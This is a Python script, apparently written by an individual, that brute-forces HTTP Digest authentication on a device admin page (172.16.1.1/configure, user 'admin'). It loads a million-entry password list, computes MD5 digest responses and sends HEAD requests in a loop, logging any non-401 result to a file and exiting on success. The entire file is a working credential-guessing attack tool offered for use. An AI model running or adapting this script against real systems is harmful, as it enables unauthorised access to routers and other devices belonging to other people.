import hashlib
import re
import requests
import secrets


# proud of this one
def md5(*args: str) -> str:
    'Takes any number of arguments, joins them with `:`, and returns the hash of that string'
    string = ":".join(str(x) for x in args)
    return hashlib.md5(string.encode()).hexdigest()


regex = re.compile(r'([^" ]+)[:=] ?"?([^" ]+)"?')


def log(request, password, counter) -> None:
    print(
        f'\nStatus {request.status_code} detected: used "{password}" and counter at {counter}\n'
    )
    with open("results.txt", "a") as results:
        results.write(
            f"Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n"
        )
    if 200 <= request.status_code < 300:
        print("Exiting")
        exit()


def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop) -> str:
    h1 = md5(user, realm, password)
    h2 = md5(method, uri)
    if qop:
        response = md5(h1, nonce, nc, cnonce, qop, h2)
    else:
        response = md5(h1, nonce, h2)
    return response


def parse_authheaders(authheader) -> dict:
    authheaders_dict = dict(regex.findall(authheader))
    auth = {'nonce': authheaders_dict['nonce']}
    try:
        auth['opaque'] = authheaders_dict['opaque']
    except KeyError:
        auth['opaque'] = None
    return auth


def main() -> None:
    total = 341400

    url = 'http://172.16.1.1/configure'
    # url = 'http://httpbin.org/digest-auth/auth/guest/guest'
    # url = 'https://jigsaw.w3.org/HTTP/Digest/'
    user = 'admin'
    # user = 'guest'
    # uri = '/configure'
    uri = '/configure'
    # uri = '/HTTP/Digest/'
    method = 'HEAD'
    filename = 'number1mil.csv'
    encoding = ''
    qop = None

    def get_encoding(fileencoding):
        return "utf8" if fileencoding == '' else fileencoding

    with open(filename, encoding=get_encoding(encoding)) as file:
        passwords = file.readlines()
    passwords = [password.rstrip() for password in passwords]

    print(len(passwords), 'passwords loaded')

    if total > len(passwords):
        print('Total is greater then amount of passwords, please change')
        exit()

    # get nonce, realm, and qop
    request = requests.head(url)
    realm = re.findall('realm="([^"]+)"', request.headers['www-authenticate'])[0]
    print('realm is', realm)
    try:
        qop = re.findall('qop="([^"]+)"', request.headers['www-authenticate'])[0]
    except KeyError:
        pass
    print('qop is', qop)

    auth = parse_authheaders(request.headers['www-authenticate'])

    for i in range(total, len(passwords)):
        cnonce = secrets.token_hex(4)
        response = hashes(
            user,
            realm,
            passwords[i],
            method,
            uri,
            auth['nonce'],
            '00000001',
            cnonce,
            qop
        )
        header = {
            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{auth["nonce"]}", uri="{uri}", algorithm=MD5, response="{response}"'
        }
        if auth['opaque']:
            header['Authorization'] += f', opaque="{auth["opaque"]}"'
        if qop:
            header['Authorization'] += f', qop={qop}, nc=00000001, cnonce="{cnonce}"'

        request = requests.head(url, headers=header)
        # print(request.request.headers)
        # triggers on status codes other than 200 but i'd want to know about those, too
        if request.status_code != 401:
            log(request, passwords[i], i)
            # new nonces are only given on 401's, so we have to make another request for one
            request = requests.head(url)

        # finally, parse headers for new nonce. This will throw a 'KeyError' if done on a 200 request
        # so it has do be done after that check
        # print(i, passwords[i], request.status_code)
        auth = parse_authheaders(request.headers["www-authenticate"])
        if i % 100 == 0:
            print(i)

    print("La fin.")


if __name__ == "__main__":
    main()
